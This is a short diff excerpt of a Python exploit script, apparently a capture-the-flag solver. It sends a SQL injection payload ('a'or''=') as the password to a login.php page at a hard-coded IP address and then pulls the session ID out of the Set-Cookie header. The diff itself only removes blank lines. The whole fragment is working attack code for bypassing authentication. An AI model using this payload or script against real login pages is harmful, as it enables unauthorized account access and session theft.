@@ -2,9 +2,7 @@ import requests
 import base64
 
 url="http://104.154.106.182:9090/login.php"
-
 data = {"username":"a","password":"a'or''='","submit":"submit"}
-
 r = requests.post(url,data=data)
 
 sessionid = r.headers["Set-Cookie"][10:-3]
